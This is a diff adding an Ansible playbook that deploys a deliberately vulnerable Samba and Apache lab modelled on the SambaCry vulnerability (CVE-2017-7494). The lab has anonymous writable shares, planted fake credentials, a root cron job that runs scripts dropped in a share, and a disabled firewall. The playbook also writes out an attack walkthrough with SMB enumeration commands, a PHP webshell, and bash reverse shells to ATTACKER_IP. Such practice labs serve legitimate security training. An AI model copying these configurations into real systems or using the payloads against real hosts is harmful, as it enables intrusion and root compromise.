@@ -1,0 +1,300 @@
+---
+- name: Deploy SambaCry Attack Chain Lab
+  hosts: samba_vm
+  become: yes
+
+  vars:
+    samba_share_path: /srv/samba/share
+    web_root: /srv/samba/www
+
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Install Samba, Apache2, and PHP
+      apt:
+        name:
+          - samba
+          - smbclient
+          - apache2
+          - php
+          - libapache2-mod-php
+        state: present
+
+    - name: Create Samba data share directory
+      file:
+        path: "{{ samba_share_path }}"
+        state: directory
+        mode: '0777'
+        owner: nobody
+        group: nogroup
+
+    - name: Create web root directory (mapped as separate SMB share)
+      file:
+        path: "{{ web_root }}"
+        state: directory
+        mode: '0777'
+        owner: www-data
+        group: www-data
+
+    - name: Back up original Samba config
+      copy:
+        src: /etc/samba/smb.conf
+        dest: /etc/samba/smb.conf.bak
+        remote_src: yes
+        force: no
+
+    - name: Deploy vulnerable Samba configuration (anonymous writable shares)
+      copy:
+        dest: /etc/samba/smb.conf
+        content: |
+          [global]
+          workgroup = WORKGROUP
+          server string = File Server %v
+          netbios name = FILESERVER
+          security = user
+          map to guest = bad user
+          dns proxy = no
+          log level = 1
+
+          [data]
+          path = {{ samba_share_path }}
+          comment = Company Data
+          browsable = yes
+          writable = yes
+          guest ok = yes
+          read only = no
+          force user = nobody
+          create mask = 0777
+          directory mask = 0777
+
+          [www]
+          path = {{ web_root }}
+          comment = Web Files
+          browsable = yes
+          writable = yes
+          guest ok = yes
+          read only = no
+          force user = www-data
+          create mask = 0777
+          directory mask = 0777
+        mode: '0644'
+
+    - name: Configure Apache to serve files from web_root
+      copy:
+        dest: /etc/apache2/sites-available/smb-web.conf
+        content: |
+          <VirtualHost *:80>
+              DocumentRoot {{ web_root }}
+              <Directory {{ web_root }}>
+                  Options Indexes FollowSymLinks
+                  AllowOverride All
+                  Require all granted
+              </Directory>
+              ErrorLog ${APACHE_LOG_DIR}/error.log
+              CustomLog ${APACHE_LOG_DIR}/access.log combined
+          </VirtualHost>
+        mode: '0644'
+
+    - name: Disable default Apache site
+      command: a2dissite 000-default.conf
+      ignore_errors: yes
+
+    - name: Enable SMB-backed web site
+      command: a2ensite smb-web.conf
+
+    - name: Create decoy index page in web root
+      copy:
+        dest: "{{ web_root }}/index.html"
+        content: |
+          <html>
+          <head><title>Internal File Server</title></head>
+          <body>
+          <h1>FILESERVER - Internal Portal</h1>
+          <p>Access restricted to authorized employees only.</p>
+          </body>
+          </html>
+        mode: '0644'
+        owner: www-data
+        group: www-data
+
+    - name: Plant simulated sensitive data in data share
+      copy:
+        dest: "{{ samba_share_path }}/internal_credentials.txt"
+        content: |
+          ========================================
+          INTERNAL SYSTEMS - CONFIDENTIAL
+          ========================================
+          Database Server:  db01.internal / db_admin / Sup3rS3cur3!
+          Backup SSH:       backupuser / backup@2023
+          VPN Access:       vpnadmin / V1rtual@Net
+          Dev Portal:       devadmin / Dev#2023
+          ========================================
+          NOTE: Please rotate passwords after use.
+        mode: '0644'
+
+    - name: Plant a README in the data share
+      copy:
+        dest: "{{ samba_share_path }}/README.txt"
+        content: |
+          Welcome to the FILESERVER data share.
+          You can find company documents and resources here.
+          For IT support, contact helpdesk@company.internal
+        mode: '0644'
+
+    - name: Create root cron job that executes shell scripts from share (privesc simulation)
+      copy:
+        dest: /etc/cron.d/share-loader
+        content: |
+          # SambaCry simulation: root loads any .run.sh dropped in the share
+          * * * * * root test -f {{ samba_share_path }}/.run.sh && bash {{ samba_share_path }}/.run.sh && rm -f {{ samba_share_path }}/.run.sh
+        mode: '0644'
+
+    - name: Enable and restart Samba services
+      systemd:
+        name: "{{ item }}"
+        state: restarted
+        enabled: yes
+      loop:
+        - smbd
+        - nmbd
+
+    - name: Enable and restart Apache
+      systemd:
+        name: apache2
+        state: restarted
+        enabled: yes
+
+    - name: Disable firewall
+      ufw:
+        state: disabled
+
+    - name: Get target IP address
+      set_fact:
+        target_ip: "{{ ansible_default_ipv4.address }}"
+
+    - name: Create info file
+      copy:
+        dest: /root/TARGET_INFO.txt
+        content: |
+          ===================================================
+          SAMBACRY ATTACK CHAIN LAB
+          ===================================================
+
+          Services:
+            - Samba (SMB)  on ports 139, 445
+            - Apache2 (HTTP) on port 80
+
+          Vulnerability Concept: CVE-2017-7494 (SambaCry)
+          Attack Pattern: SMB Anonymous Write -> Code Execution -> Privilege Escalation
+
+          Shares:
+            \\{{ target_ip }}\data  -> {{ samba_share_path }}   (anonymous writable)
+            \\{{ target_ip }}\www   -> {{ web_root }}   (anonymous writable, served by Apache)
+
+          Web URL: http://{{ target_ip }}/
+
+          ===================================================
+          PHASE 1: SMB ENUMERATION
+          ===================================================
+
+          # Nmap SMB enumeration
+          nmap -sV -p 139,445 --script smb-enum-shares,smb-security-mode {{ target_ip }}
+
+          # List shares with null session
+          smbclient -L //{{ target_ip }}/ -N
+
+          # smbmap - check share permissions
+          smbmap -H {{ target_ip }}
+          smbmap -H {{ target_ip }} -u '' -p ''
+
+          # Full enumeration with enum4linux
+          enum4linux -a {{ target_ip }}
+
+          ===================================================
+          PHASE 2: ACCESS WRITABLE SHARE & GATHER INTEL
+          ===================================================
+
+          # Connect to 'data' share as guest
+          smbclient //{{ target_ip }}/data -N
+
+          # Inside smbclient prompt:
+          #   smb: \> ls
+          #   smb: \> get internal_credentials.txt
+          #   smb: \> exit
+
+          # Mount share locally
+          mkdir /mnt/smb
+          mount -t cifs //{{ target_ip }}/data /mnt/smb -o guest,vers=3.0
+          cat /mnt/smb/internal_credentials.txt
+
+          ===================================================
+          PHASE 3: WEBSHELL UPLOAD VIA SMB -> RCE VIA HTTP
+          ===================================================
+
+          # Create PHP webshell
+          echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
+
+          # Upload to 'www' share (Apache serves this directory)
+          smbclient //{{ target_ip }}/www -N -c 'put /tmp/shell.php shell.php'
+
+          # Execute commands via HTTP
+          curl "http://{{ target_ip }}/shell.php?cmd=id"
+          curl "http://{{ target_ip }}/shell.php?cmd=whoami"
+          curl "http://{{ target_ip }}/shell.php?cmd=cat+/etc/passwd"
+
+          # Reverse shell via webshell (URL-encode the bash command)
+          curl "http://{{ target_ip }}/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
+
+          ===================================================
+          PHASE 4: PRIVILEGE ESCALATION (Cron Simulation)
+          ===================================================
+
+          # A root cron job picks up and executes .run.sh from the data share
+          # This simulates CVE-2017-7494's arbitrary code loading mechanism
+
+          # Create reverse shell script on attacker
+          cat > /tmp/revshell.sh << 'EOF'
+          #!/bin/bash
+          bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+          EOF
+
+          # Upload as .run.sh trigger file
+          smbclient //{{ target_ip }}/data -N -c 'put /tmp/revshell.sh .run.sh'
+
+          # Listen for the root shell (within ~60 seconds when cron fires)
+          nc -lvnp 4444
+
+          ===================================================
+          ATTACK CHAIN SUMMARY
+          ===================================================
+
+          1. Enumeration:  Discover SMB shares and anonymous access
+          2. Intel Gather: Read credentials.txt from writable data share
+          3. WebShell:     Upload PHP shell to 'www' share
+          4. RCE:          Execute commands as www-data via HTTP
+          5. PrivEsc:      Drop .run.sh to share, cron executes as root
+          6. Root Shell:   Catch incoming root reverse shell
+
+          ===================================================
+        mode: '0644'
+
+    - name: Display completion message
+      debug:
+        msg:
+          - "========================================================="
+          - "SambaCry Attack Chain Lab deployed successfully!"
+          - "========================================================="
+          - "Target IP:   {{ target_ip }}"
+          - "SMB Shares:  \\\\{{ target_ip }}\\data  (anonymous writable)"
+          - "             \\\\{{ target_ip }}\\www   (anonymous writable)"
+          - "HTTP:        http://{{ target_ip }}/"
+          - ""
+          - "Quick verify:"
+          - "  smbclient -L //{{ target_ip }}/ -N"
+          - "  curl http://{{ target_ip }}/"
+          - ""
+          - "Info file: /root/TARGET_INFO.txt"
+          - "========================================================="
